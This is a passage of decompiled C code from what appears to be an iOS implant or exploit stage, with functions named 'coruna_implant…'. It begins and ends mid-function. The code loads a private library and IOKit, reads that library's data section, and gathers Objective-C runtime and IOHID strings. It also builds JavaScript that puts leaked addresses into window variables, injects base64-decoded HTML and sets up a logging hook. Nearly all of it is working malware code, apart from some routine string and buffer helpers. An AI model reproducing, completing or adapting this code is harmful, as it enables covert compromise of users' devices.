  size = *(uint64_t *)(handle + 0x18);
  u = coruna_sleep(handle,handle + 0x21);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,size);
  u = coruna_sleep(handle,handle + 0x4d);
  size = coruna_sleep(handle,ptr);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),size,u);
  buf = handle + 0x54;
  handle = coruna_sleep(handle,buf);
  sa_new = 0x1f;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(addr + 0x18);
  u = coruna_sleep(handle,handle + 0x47);
  size = coruna_sleep(handle,handle + 0x22);
  coruna_implant49c4_residual_56(handle,version,handle + -0x10,u,size);
  u = coruna_sleep(handle,buf);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = 0x28;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x23;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x3f);
  coruna_implant49c4_residual_59(handle,u,0xfffffda063101,version,port,size);
  u = coruna_sleep(handle,buf);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = 0x28;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  host_info = 0x30;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&host_info);
  port = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle + 0x43);
  coruna_implant49c4_residual_59(handle,u,0xfffffda063101,version,port,size);
  u = coruna_sleep(handle,ptr);
  sa_new = 0x12;
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  coruna_implant49c4_residual_55(handle,*(uint64_t *)(handle + 0x18),u,0xffff101360adf);
  u = coruna_sleep(handle,copy);
  sa_new = (long *)coruna_u64_pack((sa_new), (0x25));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&sa_new);
  version = *(uint64_t *)(handle + 0x18);
  size = coruna_sleep(handle,handle[0x5e]);
  coruna_implant49c4_residual_56(handle,u,0xfffffda063101,version,size);
  operator_delete(str);
  if (block_ctx != (long *)0x0) {
    stack_guard = block_ctx;
    operator_delete(block_ctx);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == json_buf[9]) {
    return 0;
  }
  ___stack_chk_fail();
}





bool coruna_implant49c4_via_ret_stub(long *handle)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  uint32_t scratch;
  long bootargs;
  void *thread_attr;
  void *host_info;
  uint64_t serial_buf;
  
  thread_attr = (void *)coruna_u64_pack((thread_attr), (0x2e));
  handle = coruna_implant41e4_via_cat_4(*handle + 0x28,&thread_attr);
  handle = *(long *)(handle + 0x18);
  thread_attr = (void *)0x0;
  host_info = (void *)0x0;
  serial_buf = 0;
  coruna_implant49c4_via_abort_80e4(handle,&thread_attr);
  err = coruna_ret_stub(*(uint64_t *)*handle,thread_attr,handle[0x62],
                       (long)host_info - (long)thread_attr);
  if ((err == 0) &&
     (err = coruna_ret_stub(*(uint64_t *)*handle,handle + 6,handle + 0x28,0x10), err == 0)) {
    u = *(uint64_t *)*handle;
    scratch = 0x29;
    bootargs = handle;
    handle = coruna_implant41e4_via_cat_4((uint64_t *)*handle + 5,&scratch);
    err = coruna_ret_stub(u,&bootargs,*(uint64_t *)(handle + 0x18),8);
    err = err != 0;
  }
  else {
    err = true;
  }
  if (thread_attr != (void *)0x0) {
    host_info = thread_attr;
    operator_delete(thread_attr);
  }
  return err;
}
long * coruna_macho_data_seg(long *handle,long addr_2,uint8_t *buf,long off_3)
{
  long *ptr;
  uint8_t *ptr;
  uint64_t *****lpppppu3;
  uint8_t u;
  char *****lpppppc5;
  uint8_t *buf;
  long handle;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  void *buf;
  char *ptr;
  unsigned long kind;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  void *str;
  unsigned long *str;
  uint64_t type_id_10;
  size_t ls22;
  long off;
  uint8_t *copy;
  void *scratch;
  long bootargs;
  uint64_t thread_attr;
  uint8_t host_info[4];
  uint32_t serial_buf;
  void *action [2];
  char block_ctx;
  uint64_t ****stack_guard;
  unsigned long sa_saved;
  byte sa_new;
  uint64_t ****path_buf [2];
  char tmp_buf;
  void *region;
  void *plist;
  uint64_t url_buf;
  void *json_buf;
  void *frame;
  void *work;
  void *cache;
  void *cache_20;
  uint8_t *cache_21;
  uint8_t *cache_22;
  uint8_t *cache_23;
  char ****cache_24 [2];
  char *cache_25;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t cache_26;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t cache_27;
  uint64_t block_ctx;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t stack_guard;
  long cache_30;
  
  cache_30 = *(long *)k_implant_stack_chk_guard_slot;
  *handle = addr_2;
  handle[8] = coruna_cat(s_objc_opt_new_0000f9e0._5_3_,s_objc_opt_new_0000f9e0._0_5_);
  handle[3] = -1;
  handle[2] = -1;
  handle[5] = -1;
  handle[4] = -1;
  handle[6] = 0;
  *(unsigned long *)((long)handle + 0x45) =
       coruna_cat(s_objc_opt_new_0000f9e0._8_5_,s_objc_opt_new_0000f9e0._5_3_);
  *(unsigned long *)((long)handle + 0x4d) =
       coruna_cat(s_objc_msgSend_0000f9ed._5_3_,s_objc_msgSend_0000f9ed._0_5_);
  *(unsigned long *)((long)handle + 0x52) =
       coruna_cat(s_objc_msgSend_0000f9ed._8_5_,s_objc_msgSend_0000f9ed._5_3_);
  type_id_10 = s_object_setClass_0000f9fa._0_8_;
  *(uint64_t *)((long)handle + 0x62) = s_object_setClass_0000f9fa._8_8_;
  *(uint64_t *)((long)handle + 0x5a) = type_id_10;
  version = s_IOHIDSessionFilterSetPropertyFor_0000fa0a._16_8_;
  size = s_IOHIDSessionFilterSetPropertyFor_0000fa0a._0_8_;
  type_id_10 = coruna_cat(s_IOHIDSessionFilterSetPropertyFor_0000fa0a[0x1f],
                    s_IOHIDSessionFilterSetPropertyFor_0000fa0a._24_7_);
  *(uint64_t *)((long)handle + 0x72) = s_IOHIDSessionFilterSetPropertyFor_0000fa0a._8_8_;
  *(uint64_t *)((long)handle + 0x6a) = size;
  *(uint64_t *)((long)handle + 0x82) = type_id_10;
  *(uint64_t *)((long)handle + 0x7a) = version;
  *(unsigned long *)((long)handle + 0x89) =
       coruna_u64_pack71((s_IOHIDSessionFilterSetPropertyFor_0000fa0a._32_7_), (s_IOHIDSessionFilterSetPropertyFor_0000fa0a[0x1f]));
  version = 0;
  size = 0;
  type_id_10 = coruna_u64_pack((0), (0));
  *(uint64_t *)((long)handle + 0x99) = 0;
  *(uint64_t *)((long)handle + 0x91) = size;
  *(uint64_t *)((long)handle + 0xa9) = type_id_10;
  *(uint64_t *)((long)handle + 0xa1) = version;
  type_id_10 = coruna_u64_pack((0), (0));
  *(uint64_t *)((long)handle + 0xb5) = 0;
  *(uint64_t *)((long)handle + 0xad) = type_id_10;
  type_id_10 = s_Q56__0Q8Q16Q24Q32Q40Q48_0000fa5d._0_8_;
  *(uint64_t *)((long)handle + 0xc5) = s_Q56__0Q8Q16Q24Q32Q40Q48_0000fa5d._8_8_;
  *(uint64_t *)((long)handle + 0xbd) = type_id_10;
  *(uint64_t *)((long)handle + 0xcd) = s_Q56__0Q8Q16Q24Q32Q40Q48_0000fa5d._16_8_;
  *(uint32_t *)((long)handle + 0xe4) = 0x382267;
  type_id_10 = 0;
  *(uint64_t *)((long)handle + 0xdd) = 0;
  *(uint64_t *)((long)handle + 0xd5) = type_id_10;
  handle[0x1e] = 0;
  handle[0x1d] = 0;
  handle[0x20] = 0;
  handle[0x1f] = 0;
  handle[0x22] = 0;
  handle[0x21] = 0;
  handle = k_implant_scan_magic_b;
  handle[0x23] = k_implant_scan_magic_b;
  handle[0x24] = 0x1e;
  type_id_10 = coruna_cat(s_mainFrame_windowObject_JSValue_0000fa88._16_6_,
                    s_mainFrame_windowObject_JSValue_0000fa88._14_2_);
  *(uint64_t *)((long)handle + 0x13e) = s_mainFrame_windowObject_JSValue_0000fa88._22_8_;
  *(uint64_t *)((long)handle + 0x136) = type_id_10;
  type_id_10 = s_mainFrame_windowObject_JSValue_0000fa88._0_8_;
  handle[0x26] =
       coruna_cat(s_mainFrame_windowObject_JSValue_0000fa88._14_2_,
                s_mainFrame_windowObject_JSValue_0000fa88._8_6_);
  handle[0x25] = type_id_10;
  handle[0x29] = 0;
  handle[0x2a] = handle;
  handle[0x2b] = 0x18;
  size = s_new__browserView_webView_0000faa7._16_8_;
  type_id_10 = s_new__browserView_webView_0000faa7._0_8_;
  handle[0x2d] = s_new__browserView_webView_0000faa7._8_8_;
  handle[0x2c] = type_id_10;
  handle[0x2e] = size;
  handle[0x2f] = 0;
  handle[0x30] = handle;
  handle[0x31] = 0x12;
  *(uint16_t *)(handle + 0x34) = 0x6e75;
  type_id_10 = s_currentRunLoop_run_0000fac0._0_8_;
  handle[0x33] = s_currentRunLoop_run_0000fac0._8_8_;
  handle[0x32] = type_id_10;
  handle[0x35] = 0;
  handle[0x36] = handle;
  handle[0x37] = 0x37;
  tag = 0;
  port = 0;
  version = 0;
  size = 0;
  type_id_10 = 0;
  addr = coruna_cat(s__System_Library_PrivateFramework_0000fad3[0x2f],
                    0);
  *(unsigned long *)((long)handle + 0x1ef) =
       coruna_u64_pack71((0), (s__System_Library_PrivateFramework_0000fad3[0x2f]));
  handle[0x3b] = port;
  handle[0x3a] = version;
  handle[0x3d] = addr;
  handle[0x3c] = tag;
  handle[0x39] = size;
  handle[0x38] = type_id_10;
  handle[0x3f] = 0;
  handle[0x40] = handle;
  handle[0x41] = 1;
  *(uint8_t *)(handle + 0x42) = 99;
  handle[0x43] = 0;
  handle[0x44] = handle;
  handle[0x45] = 1;
  *(uint8_t *)(handle + 0x46) = 0x6c;
  handle[0x47] = -1;
  handle[0x48] = -1;
  handle[0x49] = 0;
  handle[0x4c] = -1;
  handle[0x4b] = -1;
  handle[0x4a] = -1;
  handle[0x4e] = -1;
  off = k_implant_insn_word_0000eb38;
  addr = k_implant_md5_mix_word_c;
  str = (unsigned long *)(handle + 0x5b);
  ptr = handle + 0x5e;
  handle[0x5e] = 0;
  handle[0x5d] = 0;
  handle[0x60] = 0;
  handle[0x5f] = 0;
  handle[0x5a] = 0;
  handle[0x59] = 0;
  handle[0x5c] = 0;
  handle[0x5b] = 0;
  handle[0x56] = off;
  handle[0x55] = addr;
  handle[0x58] = 0;
  handle[0x57] = 0;
  handle[99] = 0;
  handle[0x62] = 0;
  cache_24[0] = (char ****)0xf835;
  cache_24[1] = (char ****)_dlopen("/usr/lib/usd/libusd_ms.dylib",1);
  cache_25 = "/System/Library/Frameworks/IOKit.framework/IOKit";
  scratch = _dlopen("/System/Library/Frameworks/IOKit.framework/IOKit",1);
  buf = operator_new(0x20);
  addr = 0;
  handle[100] = (long)buf;
  handle[0x66] = (long)buf + 0x20;
  do {
    type_id_10 = *(uint64_t *)((long)cache_24 + addr);
    ((uint64_t *)((long)buf + addr))[1] = *(uint64_t *)((long)cache_24 + addr + 8);
    *(uint64_t *)((long)buf + addr) = type_id_10;
    addr = addr + 0x10;
  } while (addr != 0x20);
  handle[0x65] = (long)buf + 0x20;
  addr = 0x18;
  do {
    if (*(long *)((long)cache_24 + addr) != 0) {
      _dlclose();
      *(uint64_t *)((long)cache_24 + addr) = 0;
    }
    addr = addr + -0x10;
  } while (addr != -8);
  ptr = _getsectdatafromFramework("libusd_ms.dylib","__DATA","__bss",(unsigned long *)(handle + 99));
  handle[0x62] = (long)ptr;
  cache_21 = (uint8_t *)0x0;
  cache_22 = (uint8_t *)0x0;
  cache_23 = (uint8_t *)0x0;
  if (off_3 != 0) {
    while( true ) {
      buf = cache_21;
      off_3 = off_3 + -1;
      u = *buf;
      if (cache_22 < cache_23) {
        *cache_22 = u;
        cache_22 = cache_22 + 1;
      }
      else {
        ls22 = (long)cache_22 - (long)cache_21;
        kind = ls22 + 1;
        if ((long)kind < 0) goto fail;
        type_id_8 = ((long)cache_23 - (long)cache_21) * 2;
        if (kind <= type_id_8) {
          kind = type_id_8;
        }
        if (0x3ffffffffffffffe < (unsigned long)((long)cache_23 - (long)cache_21)) {
          kind = 0x7fffffffffffffff;
        }
        if (kind == 0) {
          copy = (uint8_t *)0x0;
        }
        else {
          copy = operator_new(kind);
        }
        ptr = copy + ls22;
        *ptr = u;
        if (0 < (long)ls22) {
          _memcpy(copy,buf,ls22);
        }
        cache_23 = copy + kind;
        cache_21 = copy;
        cache_22 = ptr + 1;
        if (buf != (uint8_t *)0x0) {
          operator_delete(buf);
        }
      }
      if (off_3 == 0) break;
      buf = buf + 1;
    }
  }
  kind = coruna_return_zero_d464((long)cache_22 - (long)cache_21,0);
  cache = (void *)0x0;
  cache_20 = (void *)0x0;
  work = (void *)0x0;
  if (kind != 0) {
    if ((long)kind < 0) {
fail:
      coruna_abort_80e4();
    }
    work = operator_new(kind);
    buf = (void *)((long)work + kind);
    cache_20 = buf;
    _bzero(work,kind);
    cache = buf;
  }
  coruna_memcpy_812c(&json_buf,&cache_21);
  coruna_implant49c4_residual_61(&json_buf,&work,0,0);
  if (json_buf != (void *)0x0) {
    frame = json_buf;
    operator_delete(json_buf);
  }
  std_string_reserve((unsigned long)str);
  buf = cache;
  for (str = work; str != buf; str = (void *)((long)str + 1)) {
    std_string_push_back((char)str);
  }
  region = (void *)0x0;
  plist = (void *)0x0;
  url_buf = 0;
  coruna_implant49c4_residual_52(&region);
  coruna_memcpy_77c8(path_buf,"");
  buf = plist;
  if (region != plist) {
    str = region;
    do {
      addr = coruna_implant41e4_via_cat_5(*handle + 0x28,str);
      if (addr != 0) {
        off = *(long *)(addr + 0x30);
        if (*(int *)(addr + 0x10) != 1) {
          addr = coruna_task_info_c830();
          off = off - addr;
        }
        coruna_memcpy_77c8(&stack_guard,"%#llx, ");
        coruna_snprintf(cache_24,&stack_guard,off);
        lpppppc5 = (char *****)cache_24[0];
        if (-1 < (long)cache_25) {
          lpppppc5 = cache_24;
        }
        std_string_append((char *)path_buf,(unsigned long)lpppppc5);
        if ((long)cache_25 < 0) {
          operator_delete(cache_24[0]);
        }
        if ((char)sa_new < '\0') {
          operator_delete(stack_guard);
        }
      }
      str = (void *)((long)str + 4);
    } while (str != buf);
  }
  coruna_memcpy_77c8(&stack_guard,"");
  coruna_memcpy_77c8(action,"window.r={%#llxn : %#llxn};");
  scratch = (void *)coruna_u64_pack((scratch), (0x2d));
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&scratch);
  type_id_10 = *(uint64_t *)(addr + 0x18);
  serial_buf = 0x2f;
  addr = coruna_implant41e4_via_cat_4(*handle + 0x28,&serial_buf);
  coruna_snprintf_2(cache_24,action,type_id_10,*(uint64_t *)(addr + 0x18));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_memcpy_77c8(action,"window.o=[%s];\n");
  lpppppu3 = (uint64_t *****)path_buf[0];
  if (-1 < tmp_buf) {
    lpppppu3 = path_buf;
  }
  coruna_snprintf(cache_24,action,lpppppu3);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_memcpy_77c8(action,"window.b=\'%s\';\n");
  coruna_snprintf(cache_24,action,*(uint64_t *)(*handle + 8));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_memcpy_77c8(action,"window.s=%#llx;\n");
  type_id_10 = coruna_task_info_c830();
  coruna_snprintf(cache_24,action,type_id_10);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  coruna_memcpy_77c8(action,"window.u=\'%s\';\n");
  coruna_snprintf(cache_24,action,*(uint64_t *)(*handle + 0x10));
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  std_string_append((char *)&stack_guard);
  coruna_memcpy_77c8(action,"e.innerHTML = window.atob(\'%s\');\n");
  if (*(char *)((long)handle + 0x2ef) < '\0') {
    str = (unsigned long *)*str;
  }
  coruna_snprintf(cache_24,action,str);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)&stack_guard,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (block_ctx < '\0') {
    operator_delete(action[0]);
  }
  std_string_append((char *)&stack_guard);
  coruna_memcpy_77c8(action,
               "function h22(a){a=a.replace(/\\//g,\'_\');console.log(`[JS.console] ${a}`);window.l(`/PREAMBLE_ ${a}     `)};"
              );
  coruna_memcpy_77c8(&scratch,"%s");
  lpppppu3 = (uint64_t *****)stack_guard;
  if (-1 < (char)sa_new) {
    lpppppu3 = &stack_guard;
  }
  coruna_snprintf_2(cache_24,&scratch,lpppppu3,5);
  lpppppc5 = (char *****)cache_24[0];
  if (-1 < (long)cache_25) {
    lpppppc5 = cache_24;
  }
  std_string_append((char *)action,(unsigned long)lpppppc5);
  if ((long)cache_25 < 0) {
    operator_delete(cache_24[0]);
  }
  if (thread_attr < '\0') {
    operator_delete(scratch);
  }
  std_string_operator_assign((string *)&stack_guard,(string *)action);
  scratch = (void *)0x0;
  bootargs = handle;
  thread_attr = sa_saved;
  if (-1 < (char)sa_new) {
    thread_attr = (unsigned long)sa_new;
  }
  coruna_implant49c4_via_implant41e4_residual_54(ptr,handle[0x5e],&scratch,host_info);
  lpppppu3 = (uint64_t *****)stack_guard;
  if (-1 < (char)sa_new) {
    sa_saved = (unsigned long)sa_new;
    lpppppu3 = &stack_guard;
  }
  coruna_implant49c4_via_abort_80e4_2(ptr,handle[0x5f],lpppppu3,(long)lpppppu3 + sa_saved);
  buf = (void *)handle[0x5e];
  kind = handle[0x5f] - (long)buf;
  buf = (uint8_t *)handle[0x5f];
  do {
    if ((kind & 7) == 0) {
      coruna_implant49c4_residual_54(handle + 0x58,200);
      cache_24[0] = (char ****)0xffffffffffffffff;
      cache_24[1] = (char ****)0xffffffffffffffff;
      scratch = 0;
      cache_25 = (char *)0x0;
      thread_attr = 0;
      bootargs = 0;
      host_info = 0;
      cache_26 = 0;
      action = 0;
      serial_buf = 0;
      block_ctx = 0;
      cache_27 = 0;
      cache_29 = 0;
      stack_guard = 0;
      cache_28 = 0xffffffffffffffff;
      coruna_implant49c4_via_abort_8388(handle + 0x58,cache_24);
      handle[0x61] = handle[0x59] + -0x78;
      cache_24[0] = (char ****)coruna_u64_pack((cache_24[0]), (0x17));
      addr = coruna_implant41e4_via_cat_4(*handle + 0x28,cache_24);
      handle[6] = *(long *)(addr + 0x18) + -0x10;
      addr = coruna_sleep(handle,handle[0x58]);
      handle[7] = addr;
      if (block_ctx < '\0') {
        operator_delete(action[0]);
      }
      if ((char)sa_new < '\0') {
        operator_delete(stack_guard);
      }
      if (tmp_buf < '\0') {
        operator_delete(path_buf[0]);
      }
      if (region != (void *)0x0) {
        plist = region;
        operator_delete(region);
      }
      if (work != (void *)0x0) {
        cache = work;
        operator_delete(work);
      }
      if (cache_21 != (uint8_t *)0x0) {
        cache_22 = cache_21;
        operator_delete(cache_21);
      }
      if (*(long *)k_implant_stack_chk_guard_slot != cache_30) {
        ___stack_chk_fail();
      }
      return handle;
    }
    if (buf < (uint8_t *)handle[0x60]) {
      copy = buf + 1;
      *buf = 0;
      handle[0x5f] = (long)copy;
    }
    else {
      type_id_8 = kind + 1;
      if ((long)type_id_8 < 0) goto fail;
      type_id = handle[0x60] - (long)buf;
      type_id_9 = type_id * 2;
      if (type_id_8 <= type_id_9) {
        type_id_8 = type_id_9;
      }
      if (0x3ffffffffffffffe < type_id) {
        type_id_8 = 0x7fffffffffffffff;
      }
      if (type_id_8 == 0) {
        str = (void *)0x0;
      }
      else {
        str = operator_new(type_id_8);
      }
      copy = (uint8_t *)((long)str + kind) + 1;
      *(uint8_t *)((long)str + kind) = 0;
      if (0 < (long)kind) {
        _memcpy(str,buf,kind);
      }
      handle[0x5e] = (long)str;
      handle[0x5f] = (long)copy;
      handle[0x60] = (long)str + type_id_8;
      if (buf != (void *)0x0) {
        operator_delete(buf);
        copy = (uint8_t *)handle[0x5f];
      }
    }
    buf = (void *)*ptr;
    kind = (long)copy - (long)buf;
    buf = copy;
  } while( true );
}





uint64_t * coruna_memcpy_77c8(uint64_t *val,char *path)
{
  size_t ls1;
  uint64_t *ptr;
  unsigned long u;
  
  ls1 = _strlen(path);
  if (0xffffffffffffffef < ls1) {
    coruna_abort_819c();
  }
  if (ls1 < 0x17) {
    *(char *)((long)val + 0x17) = (char)ls1;
    ptr = val;
    if (ls1 == 0) goto fail;
  }
  else {
    u = ls1 + 0x10 & 0xfffffffffffffff0;
    ptr = operator_new(u);
    val[1] = ls1;
    val[2] = u | 0x8000000000000000;
    *val = ptr;
  }
  _memcpy(ptr,path,ls1);
fail:
  *(uint8_t *)((long)ptr + ls1) = 0;
  return val;
}





void coruna_snprintf(uint64_t *val,char *path)
{
  char *ptr;
  int err;
  int status;
  char *buf;
  uint64_t *ptr;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  err = _snprintf((char *)0x0,0,ptr);
  u = (unsigned long)(err + 1);
  buf = operator_new__(u);
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  status = _snprintf(buf,u,ptr);
  version = (long)(buf + (long)(err + 1) + -1) - (long)buf;
  if (version < 0xfffffffffffffff0) {
    if (version < 0x17) {
      *(char *)((long)val + 0x17) = (char)version;
      ptr = val;
    }
    else {
      size = version + 0x10 & 0xfffffffffffffff0;
      ptr = operator_new(size);
      val[1] = version;
      val[2] = size | 0x8000000000000000;
      *val = ptr;
    }
    if (buf != buf + (long)(err + 1) + -1) {
      _memcpy(ptr,buf,u - 1);
      ptr = (uint64_t *)((long)ptr + (u - 1));
    }
    *(uint8_t *)ptr = 0;
    operator_delete__(buf);
    return;
  }
  coruna_abort_819c(status);
}





void coruna_snprintf_2(uint64_t *val,char *path)
{
  char *ptr;
  int err;
  int status;
  char *buf;
  uint64_t *ptr;
  unsigned long u;
  unsigned long size;
  unsigned long version;
  
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  err = _snprintf((char *)0x0,0,ptr);
  u = (unsigned long)(err + 1);
  buf = operator_new__(u);
  ptr = *(char **)path;
  if (-1 < path[0x17]) {
    ptr = path;
  }
  status = _snprintf(buf,u,ptr);
  version = (long)(buf + (long)(err + 1) + -1) - (long)buf;
  if (version < 0xfffffffffffffff0) {
    if (version < 0x17) {
      *(char *)((long)val + 0x17) = (char)version;
      ptr = val;
    }
    else {
      size = version + 0x10 & 0xfffffffffffffff0;
      ptr = operator_new(size);
      val[1] = version;
      val[2] = size | 0x8000000000000000;
      *val = ptr;
    }
    if (buf != buf + (long)(err + 1) + -1) {
      _memcpy(ptr,buf,u - 1);
      ptr = (uint64_t *)((long)ptr + (u - 1));
    }
    *(uint8_t *)ptr = 0;
    operator_delete__(buf);
    return;
  }
  coruna_abort_819c(status);
}





void * coruna_implant49c4_via_implant41e4_residual_54(long *handle,void *ctx,void *scratch,void *data_3)
{
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  unsigned long u;
  uint8_t *str;
  long handle;
  uint8_t *copy;
  size_t ls8;
  size_t ls9;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  uint8_t *host_info;
  long *serial_buf;
  
  ls8 = (long)data_3 - (long)scratch;
  if (0 < (long)ls8) {
    ptr = (uint8_t *)handle[1];
    if (handle[2] - (long)ptr < (long)ls8) {
      handle = *handle;
      ptr = ptr + (ls8 - handle);
      if ((long)ptr < 0) {
        coruna_abort_80e4();
      }
      serial_buf = handle + 2;
      u = handle[2] - handle;
      copy = (uint8_t *)(u * 2);
      if (ptr <= copy) {
        ptr = copy;
      }
      if (0x3ffffffffffffffe < u) {
        ptr = (uint8_t *)0x7fffffffffffffff;
      }
      if (ptr == (uint8_t *)0x0) {
        scratch = (void *)0x0;
      }
      else {
        scratch = operator_new((unsigned long)ptr);
      }
      ptr = (void *)((long)scratch + ((long)ctx - handle));
      host_info = (uint8_t *)((long)scratch + (long)ptr);
      bootargs = ptr;
      _memcpy(ptr,scratch,ls8);
      thread_attr = (void *)((long)ptr + ls8);
      ctx = (void *)coruna_implant41e4_residual_54(handle,&scratch,ctx);
      if (thread_attr != bootargs) {
        thread_attr = bootargs;
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      handle = (long)ptr - (long)ctx;
      copy = ptr;
      if (handle < (long)ls8) {
        ptr = (void *)((long)scratch + handle);
        ls9 = (long)data_3 - (long)ptr;
        if (0 < (long)ls9) {
          _memcpy(ptr,ptr,ls9);
          copy = ptr + ls9;
        }
        handle[1] = (long)copy;
        data_3 = ptr;
        if (handle < 1) {
          return ctx;
        }
      }
      ls9 = (long)copy - ((long)ctx + ls8);
      buf = copy;
      for (str = copy + -ls8; str < ptr; str = str + 1) {
        *buf = *str;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      if (ls9 != 0) {
        _memmove(copy + -ls9,ctx,ls9);
      }
      if ((long)data_3 - (long)scratch != 0) {
        _memmove(ctx,scratch,(long)data_3 - (long)scratch);
      }
    }
  }
  return ctx;
}





uint8_t * coruna_implant49c4_via_abort_80e4_2(long *handle,uint8_t *buf,uint8_t *data_2,uint8_t *bytes_3)
{
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  size_t ls4;
  unsigned long u;
  long handle;
  uint8_t *str;
  uint8_t *copy;
  size_t ls9;
  void *scratch;
  void *bootargs;
  void *thread_attr;
  uint8_t *host_info;
  long *serial_buf;
  
  ls9 = (long)bytes_3 - (long)data_2;
  if (0 < (long)ls9) {
    ptr = (uint8_t *)handle[1];
    if (handle[2] - (long)ptr < (long)ls9) {
      handle = *handle;
      ptr = ptr + (ls9 - handle);
      if ((long)ptr < 0) {
        coruna_abort_80e4();
      }
      serial_buf = handle + 2;
      u = handle[2] - handle;
      str = (uint8_t *)(u * 2);
      if (ptr <= str) {
        ptr = str;
      }
      if (0x3ffffffffffffffe < u) {
        ptr = (uint8_t *)0x7fffffffffffffff;
      }
      if (ptr == (uint8_t *)0x0) {
        scratch = (void *)0x0;
      }
      else {
        scratch = operator_new((unsigned long)ptr);
      }
      ptr = (void *)((long)scratch + ((long)buf - handle));
      host_info = (uint8_t *)((long)scratch + (long)ptr);
      bootargs = ptr;
      _memcpy(ptr,data_2,ls9);
      thread_attr = (void *)((long)ptr + ls9);
      buf = (uint8_t *)coruna_implant41e4_residual_54(handle,&scratch,buf);
      if (thread_attr != bootargs) {
        thread_attr = bootargs;
      }
      if (scratch != (void *)0x0) {
        operator_delete(scratch);
      }
    }
    else {
      handle = (long)ptr - (long)buf;
      str = ptr;
      if (handle < (long)ls9) {
        for (copy = data_2 + handle; copy != bytes_3; copy = copy + 1) {
          *str = *copy;
          str = str + 1;
        }
        handle[1] = (long)str;
        bytes_3 = data_2 + handle;
        if (handle < 1) {
          return buf;
        }
      }
      ls4 = (long)str - (long)(buf + ls9);
      buf = str;
      for (copy = str + -ls9; copy < ptr; copy = copy + 1) {
        *buf = *copy;
        buf = buf + 1;
      }
      handle[1] = (long)buf;
      ptr = buf;
      if (ls4 != 0) {
        _memmove(str + -ls4,buf,ls4);
      }
      for (; bytes_3 != data_2; data_2 = data_2 + 1) {
        *ptr = *data_2;
        ptr = ptr + 1;
      }
    }
  }
  return buf;
}





void coruna_implant49c4_residual_54(long *handle,unsigned long arg)
{
  size_t ls1;
  long handle;
  long addr;
  void *scratch;
  void *bootargs;
  long thread_attr;
  long host_info;
  
